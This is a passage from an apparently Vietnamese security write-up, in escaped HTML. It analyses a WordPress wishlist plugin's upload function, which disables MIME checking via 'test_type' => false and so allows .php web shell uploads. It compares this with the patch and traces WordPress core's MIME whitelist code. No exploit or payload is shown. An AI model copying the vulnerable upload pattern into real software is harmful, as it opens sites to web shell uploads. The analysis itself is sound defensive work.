wp_handle_upload(&#xA;&#x9;&#x9;$file,&#xA;&#x9;&#x9;[&#xA;&#x9;&#x9;&#x9;&amp;#39;test_form&amp;#39; =&amp;gt; false,&#xA;&#x9;&#x9;&#x9;&amp;#39;test_type&amp;#39; =&amp;gt; false,&#xA;&#x9;&#x9;]&#xA;&#x9;);&#xA;&#xA;&#x9;return $upload;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong phi√™n b·∫£n l·ªói, h√†m &lt;code&gt;tinvwl_upload_file_wc_fields_factory()&lt;/code&gt; g·ªçi ƒë·∫øn &lt;code&gt;wp_handle_upload()&lt;/code&gt; ƒë·ªÉ upload file v√†o th∆∞ m·ª•c upload ch√≠nh th·ª©c c·ªßa WordPress (&lt;code&gt;wp-content/uploads/&amp;lt;year&amp;gt;/&amp;lt;month&amp;gt;/&lt;/code&gt;)&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition bug open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;L·ªói&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;Tuy nhi√™n, t√πy ch·ªçn &lt;code&gt;test_type =&amp;gt; false&lt;/code&gt; khi·∫øn WordPress &lt;strong&gt;b·ªè qua vi·ªác ki·ªÉm tra MIME Type&lt;/strong&gt; d·ª±a tr√™n whitelist h·ª£p l·ªá.&#xA;ƒêi·ªÅu n√†y cho ph√©p k·∫ª t·∫•n c√¥ng &lt;strong&gt;upload c√°c t·ªáp nguy hi·ªÉm nh∆∞ web shell &lt;code&gt;.php&lt;/code&gt;&lt;/strong&gt; l√™n m√°y ch·ªß.&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;pre&gt;&lt;code&gt;function tinvwl_upload_file_wc_fields_factory( $file ) {&#xA;&#x9;if ( ! function_exists( &amp;#39;wp_handle_upload&amp;#39; ) ) {&#xA;&#x9;&#x9;require_once( ABSPATH . &amp;#39;wp-admin/includes/file.php&amp;#39; );&#xA;&#x9;}&#xA;&#x9;$upload = wp_handle_upload(&#xA;&#x9;&#x9;$file,&#xA;&#x9;&#x9;[&#xA;&#x9;&#x9;&#x9;&amp;#39;test_form&amp;#39; =&amp;gt; false,&#xA;&#x9;&#x9;]&#xA;&#x9;);&#xA;&#xA;&#x9;return $upload;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;B·∫£n v√° lo·∫°i b·ªè t√πy ch·ªçn &lt;code&gt;&#39;test_type&#39; =&amp;gt; false&lt;/code&gt;, n√™n m·∫∑c ƒë·ªãnh &lt;code&gt;&#39;test_type&#39; =&amp;gt; true&lt;/code&gt; k√≠ch ho·∫°t ki·ªÉm tra MIME theo whitelist, ngƒÉn upload t·ªáp nguy hi·ªÉm nh∆∞ web shell &lt;code&gt;.php&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable Code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;div class=&#34;details admonition question open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-regular fa-circle-question&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;C√¢u h·ªèi&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;Tr∆∞·ªõc khi ti·∫øn h√†nh trace, t√¥i mu·ªën t√¨m hi·ªÉu h√†m &lt;code&gt;wp_handle_upload()&lt;/code&gt;, t√¨m ƒë√°p √°n cho 2 c√¢u h·ªèi:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;V√¨ sao lo·∫°i b·ªè &lt;code&gt;&#39;test_type&#39; =&amp;gt; false&lt;/code&gt; l·∫°i k√≠ch ho·∫°t ki·ªÉm tra MIME theo whitelist?&lt;/li&gt;&#xA;&lt;li&gt;Whilelist ƒë√≥ bao g·ªìm nh·ªØng g√¨?&lt;/li&gt;&#xA;&lt;/ul&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;&lt;a href=&#34;https://developer.wordpress.org/reference/functions/wp_handle_upload/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;wp_handle_upload()&lt;/a&gt; l√† wrapper c·ªßa h√†m &lt;a href=&#34;https://developer.wordpress.org/reference/functions/wp_handle_upload/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;_wp_handle_upload()&lt;/a&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function wp_handle_upload( &amp;amp;$file, $overrides = false, $time = null ) {&#xA;&#x9;/*&#xA;&#x9; *  $_POST[&amp;#39;action&amp;#39;] must be set and its value must equal $overrides[&amp;#39;action&amp;#39;]&#xA;&#x9; *  or this:&#xA;&#x9; */&#xA;&#x9;$action = &amp;#39;wp_handle_upload&amp;#39;;&#xA;&#x9;if ( isset( $overrides[&amp;#39;action&amp;#39;] ) ) {&#xA;&#x9;&#x9;$action = $overrides[&amp;#39;action&amp;#39;];&#xA;&#x9;}&#xA;&#xA;&#x9;return _wp_handle_upload( $file, $overrides, $time, $action );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;wp_handle_upload()&lt;/code&gt; thi·∫øt l·∫≠p &lt;code&gt;$action&lt;/code&gt; v√† g·ªçi ƒë·∫øn &lt;code&gt;_wp_handle_upload()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;Trong file ch·ª©a &lt;code&gt;_wp_handle_upload()&lt;/code&gt;, d√≤ng &lt;a href=&#34;https://github.com/WordPress/wordpress-develop/blob/6.8.3/src/wp-admin/includes/file.php#L915&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;915&lt;/a&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$test_type = isset( $overrides[&amp;#39;test_type&amp;#39;] ) ? $overrides[&amp;#39;test_type&amp;#39;] : true;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;üëâ G√°n gi√° tr·ªã cho bi·∫øn &lt;code&gt;$test_type&lt;/code&gt; - n·∫øu trong &lt;code&gt;$overrides&lt;/code&gt; c√≥ key &lt;code&gt;&#39;test_type&#39;&lt;/code&gt; th√¨ d√πng gi√° tr·ªã ƒë√≥,&#xA;ng∆∞·ª£c l·∫°i th√¨ m·∫∑c ƒë·ªãnh l√† &lt;code&gt;true&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;T·ª©c khi ta kh√¥ng truy·ªÅn &lt;code&gt;test_type&lt;/code&gt; ho·∫∑c truy·ªÅn &lt;code&gt;test_type =&amp;gt; true&lt;/code&gt; th√¨ &lt;code&gt;$test_type&lt;/code&gt; l√† &lt;code&gt;true&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;T·∫°i d√≤ng &lt;a href=&#34;https://github.com/WordPress/wordpress-develop/blob/6.8.3/src/wp-admin/includes/file.php#L953-L973&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;953-973&lt;/a&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( $test_type ) {&#xA;    $wp_filetype     = wp_check_filetype_and_ext( $file[&amp;#39;tmp_name&amp;#39;], $file[&amp;#39;name&amp;#39;], $mimes );&#xA;    $ext             = empty( $wp_filetype[&amp;#39;ext&amp;#39;] ) ? &amp;#39;&amp;#39; : $wp_filetype[&amp;#39;ext&amp;#39;];&#xA;    $type            = empty( $wp_filetype[&amp;#39;type&amp;#39;] ) ? &amp;#39;&amp;#39; : $wp_filetype[&amp;#39;type&amp;#39;];&#xA;    $proper_filename = empty( $wp_filetype[&amp;#39;proper_filename&amp;#39;] ) ? &amp;#39;&amp;#39; : $wp_filetype[&amp;#39;proper_filename&amp;#39;];&#xA;&#xA;    // Check to see if wp_check_filetype_and_ext() determined the filename was incorrect.&#xA;    if ( $proper_filename ) {&#xA;        $file[&amp;#39;name&amp;#39;] = $proper_filename;&#xA;    }&#xA;&#xA;    if ( ( ! $type || ! $ext ) &amp;amp;&amp;amp; ! current_user_can( &amp;#39;unfiltered_upload&amp;#39; ) ) {&#xA;        return call_user_func_array( $upload_error_handler, array( &amp;amp;$file, __( &amp;#39;Sorry, you are not allowed to upload this file type.&amp;#39; ) ) );&#xA;    }&#xA;&#xA;    if ( ! $type ) {&#xA;        $type = $file[&amp;#39;type&amp;#39;];&#xA;    }&#xA;} else {&#xA;    $type = &amp;#39;&amp;#39;;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;N·∫øu &lt;code&gt;$test_type = true&lt;/code&gt;, h√†m s·∫Ω g·ªçi &lt;code&gt;wp_check_filetype_and_ext()&lt;/code&gt; ƒë·ªÉ ki·ªÉm tra &lt;strong&gt;ƒëu√¥i file&lt;/strong&gt; v√† &lt;strong&gt;MIME type&lt;/strong&gt; d·ª±a tr√™n danh s√°ch h·ª£p l·ªá (whitelist) c·ªßa WordPress.&#xA;N·∫øu file kh√¥ng c√≥ ƒëu√¥i ho·∫∑c MIME type h·ª£p l·ªá, v√† ng∆∞·ªùi d√πng kh√¥ng c√≥ quy·ªÅn ƒë·∫∑c bi·ªát (&lt;code&gt;unfiltered_upload&lt;/code&gt;), h·ªá th·ªëng s·∫Ω &lt;strong&gt;t·ª´ ch·ªëi upload&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/WordPress/wordpress-develop/blob/6.8.3/src/wp-includes/functions.php#L3089-L3315&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Lines 3089-3315&lt;/a&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function wp_check_filetype_and_ext( $file, $filename, $mimes = null ) {&#xA;&#x9;$proper_filename = false;&#xA;&#xA;&#x9;// Do basic extension validation and MIME mapping.&#xA;&#x9;$wp_filetype = wp_check_filetype( $filename, $mimes );&#xA;    ...&#xA;    // Validate image types.&#xA;    // Validate files that didn&amp;#39;t get validated during previous checks.&#xA;    // The mime type must be allowed.&#xA;    ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;wp_check_filetype_and_ext()&lt;/code&gt; g·ªçi ƒë·∫øn &lt;code&gt;wp_check_filetype()&lt;/code&gt; ƒë·ªÉ th·ª±c hi·ªán x√°c th·ª±c ph·∫ßn m·ªü r·ªông c∆° b·∫£n v√† √°nh x·∫° MIME.&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/WordPress/wordpress-develop/blob/6.8.3/src/wp-includes/functions.php#L3045-L3062&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Line 3045-3062&lt;/a&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function wp_check_filetype( $filename, $mimes = null ) {&#xA;&#x9;if ( empty( $mimes ) ) {&#xA;&#x9;&#x9;$mimes = get_allowed_mime_types();&#xA;&#x9;}&#xA;&#x9;$type = false;&#xA;&#x9;$ext  = false;&#xA;&#xA;&#x9;foreach ( $mimes as $ext_preg =&amp;gt; $mime_match ) {&#xA;&#x9;&#x9;$ext_preg = &amp;#39;!\.(&amp;#39; . $ext_preg . &amp;#39;)$!i&amp;#39;;&#xA;&#x9;&#x9;if ( preg_match( $ext_preg, $filename, $ext_matches ) ) {&#xA;&#x9;&#x9;&#x9;$type = $mime_match;&#xA;&#x9;&#x9;&#x9;$ext  = $ext_matches[1];&#xA;&#x9;&#x9;&#x9;break;&#xA;&#x9;&#x9;}&#xA;&#x9;}&#xA;&#xA;&#x9;return compact( &amp;#39;ext&amp;#39;, &amp;#39;type&amp;#39; );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;wp_check_filetype()&lt;/code&gt; ch·ªâ ki·ªÉm tra ƒëu√¥i file (extension) d·ª±a tr√™n whitelist MIME c·ªßa WordPress - kh√¥ng x√°c minh n·ªôi dung th·∫≠t c·ªßa file&lt;/p&gt;&#xA;&lt;p&gt;H√†m g·ªçi ƒë·∫øn &lt;code&gt;get_allowed_mime_types()&lt;/code&gt; ƒë·ªÉ l·∫•y danh s√°ch MIME Types&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/WordPress/wordpress-develop/blob/6.8.3/src/wp-includes/functions.php#L3640-L3661&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Line 3640-3661&lt;/a&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function get_allowed_mime_types( $user = null ) {&#xA;&#x9;$t = wp_get_mime_types();&#xA;&#xA;&#x9;unset( $t[&amp;#39;swf&amp;#39;], $t[&amp;#39;exe&amp;#39;] );&#xA;&#x9;if ( function_exists( &amp;#39;current_user_can&amp;#39; ) ) {&#xA;&#x9;&#x9;$unfiltered = $user ? user_can( $user, &amp;#39;unfiltered_html&amp;#39; ) : current_user_can( &amp;#39;unfiltered_html&amp;#39; );&#xA;&#x9;}&#xA;&#xA;&#x9;if ( empty( $unfiltered ) ) {&#xA;&#x9;&#x9;unset( $t[&amp;#39;htm|html&amp;#39;], $t[&amp;#39;js&amp;#39;] );&#xA;&#x9;}&#xA;&#xA;&#x9;/**&#xA;&#x9; * Filters the list of allowed mime types and file extensions.&#xA;&#x9; *&#xA;&#x9; * @since 2.0.0&#xA;&#x9; *&#xA;&#x9; * @param array            $t    Mime types keyed by the file extension regex corresponding to those types.&#xA;&#x9; * @param int|WP_User|null $user User ID, User object or null if not provided (indicates current user).&#xA;&#x9; */&#xA;&#x9;return apply_filters( &amp;#39;upload_mimes&amp;#39;, $t, $user );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;wp_get_mime_types()&lt;/code&gt; ƒë∆∞·ª£c g·ªçi s·∫Ω tr·∫£ v·ªÅ danh s√°ch MIME Types th·∫≠t s·ª± ƒë∆∞·ª£c ch·∫•p nh·∫≠n&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/WordPress/wordpress-develop/blob/6.8.3/src/wp-includes/functions.php#L3430-L3557&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Line 3430-3557&lt;/a&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function wp_get_mime_types() {&#xA;&#x9;/**&#xA;&#x9; * Filters the list of mime types and file extensions.&#xA;&#x9; *&#xA;&#x9; * This filter should be used to add, not remove, mime types. To remove&#xA;&#x9; * mime types, use the &amp;#39;upload_mimes&amp;#39; filter.&#xA;&#x9; *&#xA;&#x9; * @since 3.5.0&#xA;&#x9; *&#xA;&#x9; * @param string[] $wp_get_mime_types Mime types keyed by the file extension regex&#xA;&#x9; *                                    corresponding to those types.&#xA;&#x9; */&#xA;&#x9;return apply_filters(&#xA;&#x9;&#x9;&amp;#39;mime_types&amp;#39;,&#xA;&#x9;&#x9;array(&#xA;&#x9;&#x9;&#x9;// Image formats.&#xA;&#x9;&#x9;&#x9;&amp;#39;jpg|jpeg|jpe&amp;#39;                 =&amp;gt; &amp;#39;image/jpeg&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;gif&amp;#39;                          =&amp;gt; &amp;#39;image/gif&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;png&amp;#39;                          =&amp;gt; &amp;#39;image/png&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;bmp&amp;#39;                          =&amp;gt; &amp;#39;image/bmp&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;tiff|tif&amp;#39;                     =&amp;gt; &amp;#39;image/tiff&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;webp&amp;#39;                         =&amp;gt; &amp;#39;image/webp&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;avif&amp;#39;                         =&amp;gt; &amp;#39;image/avif&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;ico&amp;#39;                          =&amp;gt; &amp;#39;image/x-icon&amp;#39;,&#xA;&#xA;&#x9;&#x9;&#x9;// TODO: Needs improvement. All images with the following mime types seem to have .heic file extension.&#xA;&#x9;&#x9;&#x9;&amp;#39;heic&amp;#39;                         =&amp;gt; &amp;#39;image/heic&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;heif&amp;#39;                         =&amp;gt; &amp;#39;image/heif&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;heics&amp;#39;                        =&amp;gt; &amp;#39;image/heic-sequence&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;heifs&amp;#39;                        =&amp;gt; &amp;#39;image/heif-sequence&amp;#39;,&#xA;&#xA;&#x9;&#x9;&#x9;// Video formats.&#xA;&#x9;&#x9;&#x9;&amp;#39;asf|asx&amp;#39;                      =&amp;gt; &amp;#39;video/x-ms-asf&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;wmv&amp;#39;                          =&amp;gt; &amp;#39;video/x-ms-wmv&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;wmx&amp;#39;                          =&amp;gt; &amp;#39;video/x-ms-wmx&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;wm&amp;#39;                           =&amp;gt; &amp;#39;video/x-ms-wm&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;avi&amp;#39;                          =&amp;gt; &amp;#39;video/avi&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;divx&amp;#39;                         =&amp;gt; &amp;#39;video/divx&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;flv&amp;#39;                          =&amp;gt; &amp;#39;video/x-flv&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;mov|qt&amp;#39;                       =&amp;gt; &amp;#39;video/quicktime&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;mpeg|mpg|mpe&amp;#39;                 =&amp;gt; &amp;#39;video/mpeg&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;mp4|m4v&amp;#39;                      =&amp;gt; &amp;#39;video/mp4&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;ogv&amp;#39;                          =&amp;gt; &amp;#39;video/ogg&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;webm&amp;#39;                         =&amp;gt; &amp;#39;video/webm&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;mkv&amp;#39;                          =&amp;gt; &amp;#39;video/x-matroska&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;3gp|3gpp&amp;#39;                     =&amp;gt; &amp;#39;video/3gpp&amp;#39;,  // Can also be audio.&#xA;&#x9;&#x9;&#x9;&amp;#39;3g2|3gp2&amp;#39;                     =&amp;gt; &amp;#39;video/3gpp2&amp;#39;, // Can also be audio.&#xA;&#x9;&#x9;&#x9;// Text formats.&#xA;&#x9;&#x9;&#x9;&amp;#39;txt|asc|c|cc|h|srt&amp;#39;           =&amp;gt; &amp;#39;text/plain&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;csv&amp;#39;                          =&amp;gt; &amp;#39;text/csv&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;tsv&amp;#39;                          =&amp;gt; &amp;#39;text/tab-separated-values&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;ics&amp;#39;                          =&amp;gt; &amp;#39;text/calendar&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;rtx&amp;#39;                          =&amp;gt; &amp;#39;text/richtext&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;css&amp;#39;                          =&amp;gt; &amp;#39;text/css&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;htm|html&amp;#39;                     =&amp;gt; &amp;#39;text/html&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;vtt&amp;#39;                          =&amp;gt; &amp;#39;text/vtt&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;dfxp&amp;#39;                         =&amp;gt; &amp;#39;application/ttaf&amp;#43;xml&amp;#39;,&#xA;&#x9;&#x9;&#x9;// Audio formats.&#xA;&#x9;&#x9;&#x9;&amp;#39;mp3|m4a|m4b&amp;#39;                  =&amp;gt; &amp;#39;audio/mpeg&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;aac&amp;#39;                          =&amp;gt; &amp;#39;audio/aac&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;ra|ram&amp;#39;                       =&amp;gt; &amp;#39;audio/x-realaudio&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;wav|x-wav&amp;#39;                    =&amp;gt; &amp;#39;audio/wav&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;ogg|oga&amp;#39;                      =&amp;gt; &amp;#39;audio/ogg&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;flac&amp;#39;                         =&amp;gt; &amp;#39;audio/flac&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;mid|midi&amp;#39;                     =&amp;gt; &amp;#39;audio/midi&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;wma&amp;#39;                          =&amp;gt; &amp;#39;audio/x-ms-wma&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;wax&amp;#39;                          =&amp;gt; &amp;#39;audio/x-ms-wax&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;mka&amp;#39;                          =&amp;gt; &amp;#39;audio/x-matroska&amp;#39;,&#xA;&#x9;&#x9;&#x9;// Misc application formats.&#xA;&#x9;&#x9;&#x9;&amp;#39;rtf&amp;#39;                          =&amp;gt; &amp;#39;application/rtf&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;js&amp;#39;                           =&amp;gt; &amp;#39;application/javascript&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;pdf&amp;#39;                          =&amp;gt; &amp;#39;application/pdf&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;swf&amp;#39;                          =&amp;gt; &amp;#39;application/x-shockwave-flash&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;class&amp;#39;                        =&amp;gt; &amp;#39;application/java&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;tar&amp;#39;                          =&amp;gt; &amp;#39;application/x-tar&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;zip&amp;#39;                          =&amp;gt; &amp;#39;application/zip&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;gz|gzip&amp;#39;                      =&amp;gt; &amp;#39;application/x-gzip&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;rar&amp;#39;                          =&amp;gt; &amp;#39;application/rar&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;7z&amp;#39;                           =&amp;gt; &amp;#39;application/x-7z-compressed&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;exe&amp;#39;                          =&amp;gt; &amp;#39;application/x-msdownload&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;psd&amp;#39;                          =&amp;gt; &amp;#39;application/octet-stream&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;xcf&amp;#39;                          =&amp;gt; &amp;#39;application/octet-stream&amp;#39;,&#xA;&#x9;&#x9;&#x9;// MS Office formats.&#xA;&#x9;&#x9;&#x9;&amp;#39;doc&amp;#39;                          =&amp;gt; &amp;#39;application/msword&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;pot|pps|ppt&amp;#39;                  =&amp;gt; &amp;#39;application/vnd.ms-powerpoint&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;wri&amp;#39;                          =&amp;gt; &amp;#39;application/vnd.ms-write&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;xla|xls|xlt|xlw&amp;#39;              =&amp;gt; &amp;#39;application/vnd.ms-excel&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;mdb&amp;#39;                          =&amp;gt; &amp;#39;application/vnd.ms-access&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;mpp&amp;#39;                          =&amp;gt; &amp;#39;application/vnd.ms-project&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;docx&amp;#39;                         =&amp;gt; &amp;#39;application/vnd.openxmlformats-officedocument.wordprocessingml.document&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;docm&amp;#39;                         =&amp;gt; &amp;#39;application/vnd.ms-word.document.macroEnabled.12&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;dotx&amp;#39;                         =&amp;gt; &amp;#39;application/vnd.openxmlformats-officedocument.wordprocessingml.template&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;dotm&amp;#39;                         =&amp;gt; &amp;#39;application/vnd.ms-word.template.macroEnabled.12&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;xlsx&amp;#39;                         =&amp;gt; &amp;#39;application/vnd.openxmlformats-officedocument.spreadsheetml.sheet&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;xlsm&amp;#39;                         =&amp;gt; &amp;#39;application/vnd.ms-excel.sheet.macroEnabled.12&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;xlsb&amp;#39;                         =&amp;gt; &amp;#39;application/vnd.ms-excel.sheet.binary.macroEnabled.12&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;xltx&amp;#39;                         =&amp;gt; &amp;#39;application/vnd.openxmlformats-officedocument.spreadsheetml.template&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;xltm&amp;#39;                         =&amp;gt; &amp;#39;application/vnd.ms-excel.template.macroEnabled.12&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;xlam&amp;#39;                         =&amp;gt; &amp;#39;application/vnd.ms-excel.addin.macroEnabled.12&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;pptx&amp;#39;                         =&amp;gt; &amp;#39;application/vnd.openxmlformats-officedocument.presentationml.presentation&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;pptm&amp;#39;                         =&amp;gt; &amp;#39;application/vnd.ms-powerpoint.presentation.macroEnabled.12&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;ppsx&amp;#39;                         =&amp;gt; &amp;#39;application/vnd.openxmlformats-officedocument.presentationml.slideshow&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;ppsm&amp;#39;                         =&amp;gt; &amp;#39;application/vnd.ms-powerpoint.slideshow.macroEnabled.12&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;potx&amp;#39;                         =&amp;gt; &amp;#39;application/vnd.openxmlformats-officedocument.presentationml.template&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;potm&amp;#39;                         =&amp;gt; &amp;#39;application/vnd.ms-powerpoint.template.macroEnabled.12&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;ppam&amp;#39;                         =&amp;gt; &amp;#39;application/vnd.ms-powerpoint.addin.macroEnabled.12&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;sldx&amp;#39;                         =&amp;gt; &amp;#39;application/vnd.openxmlformats-officedocument.presentationml.slide&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;sldm&amp;#39;                         =&amp;gt; &amp;#39;application/vnd.ms-powerpoint.slide.macroEnabled.12&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;onetoc|onetoc2|onetmp|onepkg&amp;#39; =&amp;gt; &amp;#39;application/onenote&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;oxps&amp;#39;                         =&amp;gt; 